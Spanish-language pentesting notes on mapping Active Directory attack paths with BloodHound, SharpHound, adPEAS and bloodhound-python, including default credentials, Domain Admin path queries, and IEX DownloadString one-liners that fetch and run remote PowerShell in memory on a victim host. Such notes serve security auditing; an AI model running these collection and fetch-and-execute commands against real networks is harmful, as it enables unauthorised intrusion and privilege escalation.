# Bloodhound 

Tags: #AD #BloodHound #SharpHound #Kali #Parrot 

**BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.

* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries/tree/master/BloodHound_Custom_Queries)
* [Bloodhound](https://www.kali.org/tools/bloodhound/)

```bash 
❯ bloodhound-setup           # Iniciar el neo4j 'http:localhost:7474'   
❯ BloodHound --no-sandbox    # Ejecutar Bloodhound y se abre en la web 'http://localhost:8080/ui/login'

Notas: 
	1. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j' y conectarse a la web 'Bloodhound' para agregar las nuevas credenciales 'admin:admin'
	2. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
```

```bash 
Enumerar lo siguiente en BloodHound en 'Analysis':

	1. Identificación de 'Doman Admins'
	2. Identificación de 'usuarios Kerberoasteables'
	3. Identificación de 'usuarios AS-REP Roastable'
	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
	5. Identificación de 'Unsconstrained Delegation'
	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
```

```bash 
Una vez obtenido un usuario:

# Manera 1
1. Agregar la opción 'Mark User as Owned'
2. Darle click al usuario y se seleccionará el menú 'Node Info'
	1. Seleccionar la opción 'Reachable High Value Targets' para ver el camino y lo que deberiamos de hacer para ser usuario 'Administrator' en 'Overview'
	2. Seleccionar 'First Degree Object Control' en 'Outbound control rights' para ver si el usuario contempla alguna acción 
```

## SharpHound 

* [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
* [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

```powershell 
❯ Import-Module .\SharpHound.ps1       # Importar el modulo, tambien se puede hacer con el '.exe'

❯ Invoke-BloodHound -CollectionMethod All
```

```powershell
# Importar el modulo en memoria
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 

❯ Invoke-BloodHound -CollectionMethod All     


Notas: 
	1. Si se ha instalado 'BloodHound' con 'apt' se debe de usar 'SharpHound.exe' que se encuentra en la ruta de instalacion del BloodHound para que se puedan cargar los datos 
	2. Recolectar la información en la maquina victima Windows y obtener un archivo '.zip' para agregarlo a 'BloodHound'
```

## ADPeas 

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada

Notas: 
	1. Al usar ADPeas para hacer la recolección ejecuta 'SharpHound' automaticamente
```

## Subir Data por Python a BloodHound

```bash
❯ bloodhound-python -d Domain.local -u User -p Password -ns IP_DC -c all   # Ejecutamos para recopilar la data y asi poder subir el archivo a la plataforma de Bloodhound

Notas: 
	1. Importamos todos los archivos que fueron generados en formato 'Json'
```

## SharpHound con credenciales Validas desde un CMD en Windows 

```bash 
# Autenticarse en un 'CMD' en Windows con credenciales validas
❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 

❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 

❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller IP   # Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows.
Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHound' para analizar

❯ python3 -m http.server 80     # Crear un recurso compartido a nivel de red para pasar archivos 
```